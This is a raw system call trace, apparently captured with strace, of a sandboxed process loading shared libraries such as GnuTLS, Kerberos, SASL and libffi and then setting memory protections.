22    14:56:49.416636 mmap(0x74e6ec705000, 1441792, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, 0x48000) = 0x74e6ec705000
22    14:56:49.417051 mmap(0x74e6ec865000, 20480, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, 0x1a8000) = 0x74e6ec865000
22    14:56:49.417425 close(3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>) = 0
22    14:56:49.417765 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libgnutls.so.30", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>
22    14:56:49.418142 read(3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.418479 fstat(3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, {st_mode=S_IFREG|0644, st_size=2065824, ...}) = 0
22    14:56:49.418854 mmap(NULL, 2075936, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, 0) = 0x74e6ec4c2000
22    14:56:49.419191 mmap(0x74e6ec4f5000, 1286144, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, 0x33000) = 0x74e6ec4f5000
22    14:56:49.419531 mmap(0x74e6ec62f000, 495616, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, 0x16d000) = 0x74e6ec62f000
22    14:56:49.419869 mmap(0x74e6ec6a8000, 73728, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, 0x1e6000) = 0x74e6ec6a8000
22    14:56:49.420216 mmap(0x74e6ec6ba000, 11552, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x74e6ec6ba000
22    14:56:49.420564 close(3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>) = 0
22    14:56:49.421007 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libhogweed.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>
22    14:56:49.421406 read(3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.421794 fstat(3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, {st_mode=S_IFREG|0644, st_size=288920, ...}) = 0
22    14:56:49.422167 mmap(NULL, 290832, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, 0) = 0x74e6ec47a000
22    14:56:49.422547 mmap(0x74e6ec482000, 81920, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, 0x8000) = 0x74e6ec482000
22    14:56:49.422973 mmap(0x74e6ec496000, 167936, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, 0x1c000) = 0x74e6ec496000
22    14:56:49.423340 mmap(0x74e6ec4bf000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, 0x44000) = 0x74e6ec4bf000
22    14:56:49.423881 close(3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>) = 0
22    14:56:49.424738 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libnettle.so.8", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>
22    14:56:49.425382 read(3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.425891 fstat(3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, {st_mode=S_IFREG|0644, st_size=342280, ...}) = 0
22    14:56:49.426408 mmap(NULL, 344192, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, 0) = 0x74e6ec425000
22    14:56:49.426917 mmap(0x74e6ec431000, 192512, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, 0xc000) = 0x74e6ec431000
22    14:56:49.427366 mmap(0x74e6ec460000, 94208, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, 0x3b000) = 0x74e6ec460000
22    14:56:49.427802 mmap(0x74e6ec477000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, 0x51000) = 0x74e6ec477000
22    14:56:49.428204 close(3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>) = 0
22    14:56:49.428584 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libgmp.so.10", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>
22    14:56:49.428987 read(3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.429329 fstat(3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, {st_mode=S_IFREG|0644, st_size=534896, ...}) = 0
22    14:56:49.429668 mmap(NULL, 537072, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, 0) = 0x74e6ec3a1000
22    14:56:49.430013 mmap(0x74e6ec3ab000, 405504, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, 0xa000) = 0x74e6ec3ab000
22    14:56:49.430363 mmap(0x74e6ec40e000, 86016, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, 0x6d000) = 0x74e6ec40e000
22    14:56:49.430781 mmap(0x74e6ec423000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, 0x81000) = 0x74e6ec423000
22    14:56:49.431150 close(3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>) = 0
22    14:56:49.431498 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libkrb5.so.3", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>
22    14:56:49.431875 read(3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.432220 fstat(3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, {st_mode=S_IFREG|0644, st_size=823488, ...}) = 0
22    14:56:49.432559 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x74e6ec39f000
22    14:56:49.432906 mmap(NULL, 822032, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, 0) = 0x74e6ec2d6000
22    14:56:49.433241 mmap(0x74e6ec2f6000, 397312, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, 0x20000) = 0x74e6ec2f6000
22    14:56:49.433581 mmap(0x74e6ec357000, 233472, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, 0x81000) = 0x74e6ec357000
22    14:56:49.433935 mmap(0x74e6ec390000, 61440, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, 0xba000) = 0x74e6ec390000
22    14:56:49.434296 close(3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>) = 0
22    14:56:49.434653 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libk5crypto.so.3", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>
22    14:56:49.435067 read(3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.435404 fstat(3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, {st_mode=S_IFREG|0644, st_size=178648, ...}) = 0
22    14:56:49.435749 mmap(NULL, 176392, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, 0) = 0x74e6ec2aa000
22    14:56:49.436085 mmap(0x74e6ec2ae000, 110592, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, 0x4000) = 0x74e6ec2ae000
22    14:56:49.436436 mmap(0x74e6ec2c9000, 45056, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, 0x1f000) = 0x74e6ec2c9000
22    14:56:49.436820 mmap(0x74e6ec2d4000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, 0x2a000) = 0x74e6ec2d4000
22    14:56:49.437226 close(3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>) = 0
22    14:56:49.437563 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libcom_err.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>
22    14:56:49.437942 read(3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.438278 fstat(3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, {st_mode=S_IFREG|0644, st_size=18504, ...}) = 0
22    14:56:49.438643 mmap(NULL, 20552, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, 0) = 0x74e6ec2a4000
22    14:56:49.438970 mmap(0x74e6ec2a6000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, 0x2000) = 0x74e6ec2a6000
22    14:56:49.439295 mmap(0x74e6ec2a7000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, 0x3000) = 0x74e6ec2a7000
22    14:56:49.439611 mmap(0x74e6ec2a8000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, 0x3000) = 0x74e6ec2a8000
22    14:56:49.440103 close(3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>) = 0
22    14:56:49.440569 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libkrb5support.so.0", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>
22    14:56:49.441009 read(3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.441379 fstat(3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, {st_mode=S_IFREG|0644, st_size=47904, ...}) = 0
22    14:56:49.441739 mmap(NULL, 50128, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, 0) = 0x74e6ec297000
22    14:56:49.442053 mmap(0x74e6ec29a000, 24576, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, 0x3000) = 0x74e6ec29a000
22    14:56:49.442367 mmap(0x74e6ec2a0000, 8192, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, 0x9000) = 0x74e6ec2a0000
22    14:56:49.442687 mmap(0x74e6ec2a2000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, 0xa000) = 0x74e6ec2a2000
22    14:56:49.443036 close(3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>) = 0
22    14:56:49.443351 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libsasl2.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>
22    14:56:49.443701 read(3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.444006 fstat(3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, {st_mode=S_IFREG|0644, st_size=101200, ...}) = 0
22    14:56:49.444341 mmap(NULL, 103328, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, 0) = 0x74e6ec27d000
22    14:56:49.444654 mmap(0x74e6ec280000, 65536, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, 0x3000) = 0x74e6ec280000
22    14:56:49.444967 mmap(0x74e6ec290000, 20480, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, 0x13000) = 0x74e6ec290000
22    14:56:49.445281 mmap(0x74e6ec295000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, 0x17000) = 0x74e6ec295000
22    14:56:49.445615 close(3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>) = 0
22    14:56:49.445941 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libbrotlicommon.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>
22    14:56:49.446320 read(3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.446681 fstat(3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, {st_mode=S_IFREG|0644, st_size=141640, ...}) = 0
22    14:56:49.447049 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x74e6ec27b000
22    14:56:49.447430 mmap(NULL, 139304, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, 0) = 0x74e6ec258000
22    14:56:49.447814 mmap(0x74e6ec259000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, 0x1000) = 0x74e6ec259000
22    14:56:49.448166 mmap(0x74e6ec25a000, 126976, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, 0x2000) = 0x74e6ec25a000
22    14:56:49.448503 mmap(0x74e6ec279000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, 0x21000) = 0x74e6ec279000
22    14:56:49.448888 close(3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>) = 0
22    14:56:49.449242 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libp11-kit.so.0", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>
22    14:56:49.449623 read(3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.449958 fstat(3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, {st_mode=S_IFREG|0644, st_size=1714008, ...}) = 0
22    14:56:49.450293 mmap(NULL, 1717896, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, 0) = 0x74e6ec0b4000
22    14:56:49.450621 mmap(0x74e6ec0ec000, 860160, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, 0x38000) = 0x74e6ec0ec000
22    14:56:49.450970 mmap(0x74e6ec1be000, 520192, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, 0x10a000) = 0x74e6ec1be000
22    14:56:49.451310 mmap(0x74e6ec23d000, 106496, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, 0x188000) = 0x74e6ec23d000
22    14:56:49.451656 mmap(0x74e6ec257000, 1672, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x74e6ec257000
22    14:56:49.452005 close(3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>) = 0
22    14:56:49.452338 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libtasn1.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>
22    14:56:49.452711 read(3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.453045 fstat(3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, {st_mode=S_IFREG|0644, st_size=88216, ...}) = 0
22    14:56:49.453385 mmap(NULL, 86568, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, 0) = 0x74e6ec09e000
22    14:56:49.453718 mmap(0x74e6ec0a1000, 57344, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, 0x3000) = 0x74e6ec0a1000
22    14:56:49.454056 mmap(0x74e6ec0af000, 12288, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, 0x11000) = 0x74e6ec0af000
22    14:56:49.454421 mmap(0x74e6ec0b2000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, 0x14000) = 0x74e6ec0b2000
22    14:56:49.454786 close(3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>) = 0
22    14:56:49.455127 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libkeyutils.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>
22    14:56:49.455502 read(3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.455950 fstat(3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, {st_mode=S_IFREG|0644, st_size=22600, ...}) = 0
22    14:56:49.456443 mmap(NULL, 24592, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, 0) = 0x74e6ec097000
22    14:56:49.456900 mmap(0x74e6ec099000, 8192, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, 0x2000) = 0x74e6ec099000
22    14:56:49.457722 mmap(0x74e6ec09b000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, 0x4000) = 0x74e6ec09b000
22    14:56:49.458225 mmap(0x74e6ec09c000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, 0x4000) = 0x74e6ec09c000
22    14:56:49.458799 close(3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>) = 0
22    14:56:49.459303 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libresolv.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libresolv.so.2>
22    14:56:49.459802 read(3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.460222 fstat(3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, {st_mode=S_IFREG|0644, st_size=64008, ...}) = 0
22    14:56:49.460642 mmap(NULL, 71816, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, 0) = 0x74e6ec085000
22    14:56:49.461021 mmap(0x74e6ec088000, 36864, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, 0x3000) = 0x74e6ec088000
22    14:56:49.461382 mmap(0x74e6ec091000, 8192, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, 0xc000) = 0x74e6ec091000
22    14:56:49.461775 mmap(0x74e6ec093000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, 0xe000) = 0x74e6ec093000
22    14:56:49.462278 mmap(0x74e6ec095000, 6280, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x74e6ec095000
22    14:56:49.462721 close(3</usr/lib/x86_64-linux-gnu/libresolv.so.2>) = 0
22    14:56:49.463122 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libffi.so.8", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>
22    14:56:49.463549 read(3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    14:56:49.463917 fstat(3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, {st_mode=S_IFREG|0644, st_size=47672, ...}) = 0
22    14:56:49.464277 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x74e6ec083000
22    14:56:49.464614 mmap(NULL, 46608, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, 0) = 0x74e6ec077000
22    14:56:49.464963 mmap(0x74e6ec079000, 28672, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, 0x2000) = 0x74e6ec079000
22    14:56:49.465303 mmap(0x74e6ec080000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, 0x9000) = 0x74e6ec080000
22    14:56:49.465640 mmap(0x74e6ec081000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, 0xa000) = 0x74e6ec081000
22    14:56:49.466064 close(3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>) = 0
22    14:56:49.466457 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x74e6ec075000
22    14:56:49.466892 mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x74e6ec072000
22    14:56:49.467256 arch_prctl(ARCH_SET_FS, 0x74e6ec072940) = 0
22    14:56:49.467594 set_tid_address(0x74e6ec072c10) = 22
22    14:56:49.467958 set_robust_list(0x74e6ec072c20, 24) = 0
22    14:56:49.468325 rseq(0x74e6ec073260, 0x20, 0, 0x53053053) = 0
22    14:56:49.468761 mprotect(0x74e6ed2a8000, 16384, PROT_READ) = 0
22    14:56:49.469144 mprotect(0x74e6ec081000, 4096, PROT_READ) = 0
22    14:56:49.469601 mprotect(0x74e6ec093000, 4096, PROT_READ) = 0
22    14:56:49.469988 mprotect(0x74e6ec09c000, 4096, PROT_READ) = 0
22    14:56:49.470340 mprotect(0x74e6ec0b2000, 4096, PROT_READ) = 0
22    14:56:49.470905 mprotect(0x74e6ec23d000, 53248, PROT_READ) = 0
22    14:56:49.471282 mprotect(0x74e6ec279000, 4096, PROT_READ) = 0
22    14:56:49.472014 mprotect(0x74e6eceaa000, 376832, PROT_READ) = 0
22    14:56:49.472371 mprotect(0x74e6ec295000, 4096, PROT_READ) = 0
22    14:56:49.472709 mprotect(0x74e6ec2a2000, 4096, PROT_READ) = 0
22    14:56:49.473048 mprotect(0x74e6ec2a8000, 4096, PROT_READ) = 0
22    14:56:49.473390 mprotect(0x74e6ec2d4000, 4096, PROT_READ) = 0
22    14:56:49.473984 mprotect(0x74e6ec390000, 53248, PROT_READ) = 0
22    14:56:49.474593 mprotect(0x74e6ec423000, 4096, PROT_READ) = 0
22    14:56:49.475128 mprotect(0x74e6ec477000, 8192, PROT_READ) = 0
22    14:56:49.475548 mprotect(0x74e6ec4bf000, 8192, PROT_READ) = 0
22    14:56:49.475983 mprotect(0x74e6ec865000, 16384, PROT_READ) = 0
22    14:56:49.476326 mprotect(0x74e6ed07a000, 4096, PROT_READ) = 0
22    14:56:49.476976 mprotect(0x74e6ec6a8000, 65536, PROT_READ) = 0
22    14:56:49.477355 mprotect(0x74e6ec878000, 4096, PROT_READ) = 0
22    14:56:49.477701 mprotect(0x74e6ec932000, 4096, PROT_READ) = 0
22    14:56:49.478048 mprotect(0x74e6ec942000, 4096, PROT_READ) = 0
22    14:56:49.478463 mprotect(0x74e6ec99d000, 8192, PROT_READ) = 0
22    14:56:49.478861 mprotect(0x74e6ec9f2000, 8192, PROT_READ) = 0
22    14:56:49.479399 mprotect(0x74e6ecfa8000, 40960, PROT_READ) = 0
